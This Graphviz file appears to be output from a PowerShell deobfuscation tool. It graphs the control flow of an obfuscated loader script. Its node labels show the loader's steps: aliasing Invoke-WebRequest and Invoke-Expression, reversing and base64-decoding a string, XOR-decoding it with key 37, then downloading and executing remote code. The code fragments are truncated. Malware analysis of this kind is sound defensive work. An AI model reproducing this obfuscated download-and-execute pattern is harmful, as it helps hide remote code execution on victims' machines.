digraph G {
    rankdir=TB;
    node [
        fontname="Consolas"
        shape=box
        width=0
        height=0
        margin="0.2,0.1"
        fontsize=10
    ];
    edge [fontname="Arial", arrowhead=vee, fontsize=9];

    // Nodes
    1 [label="Id 1\lStart\lScript Start", shape=oval];
    2 [label="Id 2\lEnd\lScript End", shape=oval];
    3 [label="Id 3\lMainStart\lMain Script", shape=box];
    4 [label="Id 4\lMainEnd\lEnd Main Script", shape=box];
    5 [label="Id 5\lPipelineElement\lSet-Alias -name input -val Invoke-WebRequest\l[RESOLVABLE: 1]", shape=box, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];
    6 [label="Id 6\lPipelineElement\lSet-Alias -name output -val Invoke-Expression\l[RESOLVABLE: 1]", shape=box, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];
    7 [label="Id 7\lAssignmentStatementAst\l$a = \"RM0RAZ0QVMxED1BHKIFRXpgSDtAQRZFRVpgCfYVV...\l[RESOLVABLE: 1]", shape=box, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];
    8 [label="Id 8\lPipelineElement\l[aRRaY]::reVErse($a)\l[RESOLVABLE: 1]", shape=box, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];
    9 [label="Id 9\lAssignmentStatementAst\l$b = [sYstEM.CoNveRt]::froMbasE64strING($a...\l[RESOLVABLE: 2]", shape=box, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];
    10 [label="Id 10\lLoopStart\lfor ($x = 0; $x -lt $b.Count; $x++)", shape=box];
    11 [label="Id 11\lForInit\l$x = 0", shape=box];
    12 [label="Id 12\lCondition\l[bool]($x -lt $b.Count)\l[RESOLVABLE: 2]", shape=diamond, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];
    13 [label="Id 13\lLoopEnd\lEnd For", shape=box];
    14 [label="Id 14\lForIter\l$x++\l[RESOLVABLE: 1]", shape=box, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];
    15 [label="Id 15\lAssignmentStatementAst\l${B}[${x}] = ${B}[${X}] -bxor 37\l[RESOLVABLE: 3]", shape=box, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];
    16 [label="Id 16\lPipelineElement\lWrite-Host \"xxx\"\l[RESOLVABLE: 1]", shape=box, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];
    17 [label="Id 17\lAssignmentStatementAst\l$c = (input ([sySteM.tExt.EncOding]::UTF8.GetSt...\l[RESOLVABLE: 6]\l[ALIAS: input->Invoke-WebRequest]", shape=box, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];
    18 [label="Id 18\lPipelineElement\loutput $c\l[RESOLVABLE: 1]\l[ALIAS: output->Invoke-Expression]", shape=box, style=filled, fillcolor="#fff3cc", color="#cc9900", penwidth=2];

    // Edges
    1 -> 3;
    3 -> 5;
    5 -> 6;
    6 -> 7;
    7 -> 8;
    8 -> 9;
    9 -> 10;
    10 -> 11;
    11 -> 12;
    12 -> 15 [label="True"];
    15 -> 14;
    14 -> 12;
    12 -> 13 [label="False"];
    13 -> 16;
    16 -> 17;
    17 -> 18;
    18 -> 4;
    4 -> 2;
}